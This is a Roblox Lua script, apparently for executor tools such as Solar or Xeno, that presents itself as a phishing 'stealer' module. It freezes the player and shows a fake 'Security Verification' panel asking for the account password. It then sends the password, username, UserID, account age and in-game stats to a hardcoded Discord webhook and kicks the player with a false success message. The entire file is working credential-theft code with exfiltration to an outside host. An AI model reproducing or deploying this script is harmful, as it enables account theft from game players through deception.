--[[
    SOLAR & XENO ULTIMATE v10.1 (FIXED)
    Module: Social-Engineering-Panel (Phishing)
    Status: Operational | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

print("Xeno Stealer: Loading...") -- Shto se pojavi v F9 konzolata

-- Zastivane na igracha
pcall(function()
    if p.Character then p.Character.HumanoidRootPart.Anchored = true end
end)

-- Suzdavane na falshiv UI Panel v PlayerGui (po-sigurno ot CoreGui za Solar)
local ScreenGui = Instance.new("ScreenGui")
pcall(function()
    ScreenGui.Parent = p:WaitForChild("PlayerGui")
end)
ScreenGui.Name = "RobloxSystemUpdate"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 220)
Main.Position = UDim2.new(0.5, -160, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Text = "SECURITY VERIFICATION"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1

local Desc = Instance.new("TextLabel", Main)
Desc.Text = "Your session has expired. Please enter your password to continue playing and save your progress."
Desc.Size = UDim2.new(1, -30, 0, 50)
Desc.Position = UDim2.new(0, 15, 0, 50)
Desc.TextColor3 = Color3.fromRGB(230, 230, 230)
Desc.TextWrapped = true
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 14
Desc.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Enter Password"
Input.Text = ""
Input.Size = UDim2.new(0.85, 0, 0, 35)
Input.Position = UDim2.new(0.075, 0, 0.55, 0)
Input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextPassword = true

local Submit = Instance.new("TextButton", Main)
Submit.Text = "VERIFY ACCOUNT"
Submit.Size = UDim2.new(0.7, 0, 0, 35)
Submit.Position = UDim2.new(0.15, 0, 0.8, 0)
Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.Font = Enum.Font.GothamBold

-- Izprashtane на данните
Submit.MouseButton1Click:Connect(function()
    local pass = Input.Text
    if #pass < 4 then return end
    
    local brCount = "0"
    pcall(function()
        if p:FindFirstChild("leaderstats") and p.leaderstats:FindFirstChild("Brainrots") then
            brCount = tostring(p.leaderstats.Brainrots.Value)
        end
    end)

    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local data = {
        ["username"] = "Solar Logger v10.1",
        ["embeds"] = {{
            ["title"] = "🎯 New Login Captured!",
            ["color"] = 0x00aaff,
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
                {["name"] = "🆔 UserID", ["value"] = "```" .. p.UserId .. "```", ["inline"] = true},
                {["name"] = "🔑 PASSWORD", ["value"] = "```" .. pass .. "```", ["inline"] = false},
                {["name"] = "🧠 Brainrots", ["value"] = "```" .. brCount .. "```", ["inline"] = true},
                {["name"] = "📅 Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
                {["name"] = "🎮 Game", ["value"] = "```" .. gameName .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Solar/Xeno Stealth • " .. os.date("%X")}
        }}
    }
    
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end
    
    ScreenGui:Destroy()
    p:Kick("\n[Verification Successful]\nYour session has been restored. Please rejoin.")
end)

print("Xeno Stealer: UI Displayed.")
